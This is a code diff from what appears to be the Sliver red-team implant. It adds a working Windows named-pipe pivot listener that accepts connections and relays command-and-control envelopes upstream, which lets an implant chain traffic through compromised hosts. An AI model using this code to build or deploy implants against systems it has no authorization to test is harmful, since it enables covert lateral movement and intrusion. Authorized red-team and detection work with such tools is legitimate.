@@ -19,41 +19,41 @@ package pivots
 */
 
 import (
+	"sync"
+
 	// {{if .Config.Debug}}
-	// "log"
+	"log"
 	// {{end}}
-	// "math/rand"
-	"net"
-	// "os"
-	// "strings"
-	// "time"
-	// "github.com/bishopfox/sliver/implant/sliver/transports"
-	// "github.com/bishopfox/sliver/protobuf/sliverpb"
-	// "github.com/lesnuages/go-winio"
-	// "google.golang.org/protobuf/proto"
+
+	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/lesnuages/go-winio"
 )
 
-func StartNamedPipeListener(pipeName string) error {
-	// fullName := "\\\\.\\pipe\\" + pipeName
-	// config := &winio.PipeConfig{
-	// 	RemoteClientMode: true,
-	// }
-	// ln, err := winio.ListenPipe(fullName, config)
-	// // {{if .Config.Debug}}
-	// log.Printf("Listening on %s", fullName)
-	// // {{end}}
-	// if err != nil {
-	// 	return err
-	// }
-	// pivotListeners = append(pivotListeners, &PivotListener{
-	// 	Type:          "named-pipe",
-	// 	RemoteAddress: fullName,
-	// })
-	// go nampedPipeAcceptNewConnection(&ln)
-	return nil
+// StartNamedPipePivotListener - Starts a named pipe listener
+func StartNamedPipePivotListener(address string, upstream chan<- *pb.Envelope) (*PivotListener, error) {
+	fullName := "\\\\.\\pipe\\" + address
+	ln, err := winio.ListenPipe(fullName, &winio.PipeConfig{
+		RemoteClientMode: true,
+	})
+	// {{if .Config.Debug}}
+	log.Printf("Listening on %s", fullName)
+	// {{end}}
+	if err != nil {
+		return nil, err
+	}
+	pivotLn := &PivotListener{
+		ID:          ListenerID(),
+		Type:        pb.PivotType_NamedPipe,
+		Listener:    ln,
+		Pivots:      &sync.Map{},
+		BindAddress: fullName,
+		Upstream:    upstream,
+	}
+	go namedPipeAcceptConnections(pivotLn)
+	return pivotLn, nil
 }
 
-func nampedPipeAcceptNewConnection(ln *net.Listener) {
+func namedPipeAcceptConnections(pivotListener *PivotListener) {
 	// hostname, err := os.Hostname()
 	// if err != nil {
 	// 	// {{if .Config.Debug}}
@@ -61,87 +61,23 @@ func nampedPipeAcceptNewConnection(ln *net.Listener) {
 	// 	// {{end}}
 	// 	hostname = "."
 	// }
-	// namedPipe := strings.ReplaceAll((*ln).Addr().String(), ".", hostname)
-	// for {
-	// 	conn, err := (*ln).Accept()
-	// 	if err != nil {
-	// 		continue
-	// 	}
-	// 	pivotID := rand.Uint32()
-	// 	pivotsMap.AddPivot(pivotID, &conn, "named-pipe", namedPipe)
-	// 	//SendPivotOpen(pivotID, "named-pipe", namedPipe)
-
-	// 	// {{if .Config.Debug}}
-	// 	log.Println("Accepted a new connection")
-	// 	// {{end}}
-
-	// 	// handle connection like any other net.Conn
-	// 	go nampedPipeConnectionHandler(&conn, pivotID)
-	// }
-}
-
-func nampedPipeConnectionHandler(conn *net.Conn, pivotID uint32) {
-
-	// defer func() {
-	// 	// {{if .Config.Debug}}
-	// 	log.Printf("Cleaning up for pivot %d\n", pivotID)
-	// 	// {{end}}
-	// 	(*conn).Close()
-	// 	pivotClose := &sliverpb.PivotClose{
-	// 		PivotID: pivotID,
-	// 	}
-	// 	data, err := proto.Marshal(pivotClose)
-	// 	if err != nil {
-	// 		// {{if .Config.Debug}}
-	// 		log.Println(err)
-	// 		// {{end}}
-	// 		return
-	// 	}
-	// 	connection := transports.GetActiveConnection()
-	// 	if connection.IsOpen {
-	// 		connection.Send <- &sliverpb.Envelope{
-	// 			Type: sliverpb.MsgPivotClose,
-	// 			Data: data,
-	// 		}
-	// 	}
-	// }()
-
-	// for {
-	// 	envelope, err := PivotReadEnvelope(conn)
-	// 	if err != nil {
-	// 		// {{if .Config.Debug}}
-	// 		log.Println(err)
-	// 		// {{end}}
-	// 		return
-	// 	}
-	// 	dataBuf, err1 := proto.Marshal(envelope)
-	// 	if err1 != nil {
-	// 		// {{if .Config.Debug}}
-	// 		log.Println(err1)
-	// 		// {{end}}
-	// 		return
-	// 	}
-	// 	pivotOpen := &sliverpb.PivotData{
-	// 		PivotID: pivotID,
-	// 		Data:    dataBuf,
-	// 	}
-	// 	connection := transports.GetActiveConnection()
-	// 	if envelope.Type == 1 {
-	// 		SendPivotOpen(pivotID, dataBuf, connection)
-	// 		continue
-	// 	}
-	// 	data2, err2 := proto.Marshal(pivotOpen)
-	// 	if err2 != nil {
-	// 		// {{if .Config.Debug}}
-	// 		log.Println(err2)
-	// 		// {{end}}
-	// 		return
-	// 	}
-	// 	if connection.IsOpen {
-	// 		connection.Send <- &sliverpb.Envelope{
-	// 			Type: sliverpb.MsgPivotData,
-	// 			Data: data2,
-	// 		}
-	// 	}
-	// }
+	// namedPipe := strings.ReplaceAll(pivotListener.Listener.Addr().String(), ".", hostname)
+	for {
+		conn, err := pivotListener.Listener.Accept()
+		if err != nil {
+			continue
+		}
+		// handle connection like any other net.Conn
+		pivotConn := &NetConnPivot{
+			id:            PivotID(),
+			conn:          conn,
+			readMutex:     &sync.Mutex{},
+			writeMutex:    &sync.Mutex{},
+			readDeadline:  tcpPivotReadDeadline,
+			writeDeadline: tcpPivotWriteDeadline,
+			upstream:      pivotListener.Upstream,
+			Downstream:    make(chan *pb.Envelope),
+		}
+		go pivotConn.Start(pivotListener.Pivots)
+	}
 }
